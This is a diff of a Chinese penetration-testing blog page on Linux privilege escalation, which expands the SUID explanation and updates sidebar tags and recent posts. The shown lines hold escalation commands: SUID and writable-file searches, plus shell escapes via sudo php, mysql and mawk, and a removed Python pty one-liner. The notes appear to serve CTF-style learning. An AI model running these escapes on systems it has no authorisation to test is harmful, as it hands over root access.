@@ -49,7 +49,7 @@
         content="2021-12-01">
       <meta 
         property="og:article:modified_time" 
-        content="2021-12-02">
+        content="2021-12-03">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -325,7 +325,7 @@
     
     
       <span class="dot"></span>
-      <span>222 words</span>
+      <span>326 words</span>
     
   </div>
   
@@ -355,8 +355,14 @@
     <h2 id="u63D0_u6743_u9014_u5F84"><a href="#u63D0_u6743_u9014_u5F84" class="headerlink" title="提权途径"></a>提权途径</h2><blockquote>
 <ol>
 <li><strong>sudo</strong>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">sudo <span class="token operator">-</span>l <span class="token comment">//查询具有sudo权限命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><strong>suid</strong>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span> <span class="token comment">//查询具有suid执行权限程序</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-可利用的程序：<code>nmap、vim、find、bash、more、less、nano、cp、wget</code>  </li>
+<li><strong>suid</strong>  </li>
+</ol>
+<ul>
+<li>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。<br>如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。<br>其中，大家熟知的具有提权功能的Linux可执行文件包括：</li>
+</ul>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>u<span class="token operator">=</span>s type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span> <span class="token comment">//查询具有suid执行权限程序</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可利用的程序：<code>nmap、vim、find、bash、more、less、nano、cp、wget</code>  </p>
+<ol start="3">
 <li><strong>通过在/etc/passwd添加一个root权限账户</strong>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">find <span class="token operator">/</span> <span class="token operator">-</span>writable <span class="token operator">-</span>type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span> <span class="token comment">//查询可写权限的文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><strong>查看/etc/cron*下所含的所有文件</strong>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ls <span class="token operator">-</span>la <span class="token operator">/</span>etc<span class="token operator">/</span>cron<span class="token operator">*</span> <span class="token comment">//cron*是用来让使用者在固定时间或固定时间间隔执行程序之用(类似使用者的时程表),攻击者可根据root执行的程序寻找exp。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
@@ -374,19 +380,12 @@ sudo php <span class="token operator">-</span>r <span class="token string">"syst
 <span class="token punctuation">.</span><span class="token operator">/</span>php <span class="token operator">-</span>r <span class="token string">"pcntl_exec('/bin/sh',['-p']);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 <ol start="2">
-<li><strong>python</strong></li>
-</ol>
-<ul>
-<li>sudo  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">python <span class="token operator">-</span>c <span class="token string">'import pty;pty.spawn("/bin/sh")'</span>  <span class="token comment">//python&lt;3</span>
-python3 <span class="token operator">-</span>c <span class="token string">'import pty;pty.spawn("/bin/sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-</ul>
-<ol start="3">
 <li><strong>mysql</strong>  </li>
 </ol>
 <ul>
 <li>sudo<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">sudo <span class="token operator">-</span>u root mysql <span class="token operator">-</span>e <span class="token string">'\! /bin/bash'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ul>
-<ol start="4">
+<ol start="3">
 <li><strong>awk/mawk</strong>  </li>
 </ol>
 <ul>
@@ -432,7 +431,7 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
         <div>
           <div class="nav-label">Prev</div>
           
-            <div class="nav-title">Vulnhub-Me and My Girlfriend </div>
+            <div class="nav-title">Vulnhub|Me and My Girlfriend </div>
           
         </div>
       </a>
@@ -483,7 +482,7 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>3</span>
+    <span>5</span>
     <span>Posts</span>
   </a>
   <a 
@@ -495,7 +494,7 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>4</span>
+    <span>6</span>
     <span>Tags</span>
   </a>
 </div>
@@ -537,14 +536,14 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
       <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
         <div class="categories-list-item">
           渗透测试
-          <span class="categories-list-item-badge">1</span>
+          <span class="categories-list-item-badge">2</span>
         </div>
       </a>
     
       <a href="/categories/%E6%B8%97%E9%80%8F%E7%BB%83%E4%B9%A0/">
         <div class="categories-list-item">
           渗透练习
-          <span class="categories-list-item-badge">1</span>
+          <span class="categories-list-item-badge">2</span>
         </div>
       </a>
     
@@ -563,15 +562,9 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
   <div class="tags-list">
     
       <a 
-        href="/tags/SSH%E7%88%86%E7%A0%B4/" 
-        title="SSH爆破">
-        <div class="tags-list-item">SSH爆破</div>
-      </a>
-    
-      <a 
-        href="/tags/%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83/" 
-        title="水平越权">
-        <div class="tags-list-item">水平越权</div>
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
       </a>
     
       <a 
@@ -581,9 +574,27 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
       </a>
     
       <a 
-        href="/tags/%E6%8F%90%E6%9D%83/" 
-        title="提权">
-        <div class="tags-list-item">提权</div>
+        href="/tags/getshell/" 
+        title="getshell">
+        <div class="tags-list-item">getshell</div>
+      </a>
+    
+      <a 
+        href="/tags/Metasoploit/" 
+        title="Metasoploit">
+        <div class="tags-list-item">Metasoploit</div>
+      </a>
+    
+      <a 
+        href="/tags/SSH%E7%88%86%E7%A0%B4/" 
+        title="SSH爆破">
+        <div class="tags-list-item">SSH爆破</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83/" 
+        title="水平越权">
+        <div class="tags-list-item">水平越权</div>
       </a>
     
   </div>
@@ -619,18 +630,23 @@ mawk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span><spa
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-12-03</div>
+        <a href="/75811fbe.html"><div class="recent-posts-item-content">getshell</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-12-03</div>
+        <a href="/a8b692c1.html"><div class="recent-posts-item-content">Vulnhub|Os-hackNos</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-12-02</div>
-        <a href="/6ceb590b.html"><div class="recent-posts-item-content">Vulnhub-Me and My Girlfriend</div></a>
+        <a href="/6ceb590b.html"><div class="recent-posts-item-content">Vulnhub|Me and My Girlfriend</div></a>
       </div>
     
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-12-01</div>
         <a href="/e2181504.html"><div class="recent-posts-item-content">提权</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-11-30</div>
-        <a href="/b822f9c7.html"><div class="recent-posts-item-content">勇敢一点</div></a>
       </div>
     
   </div>
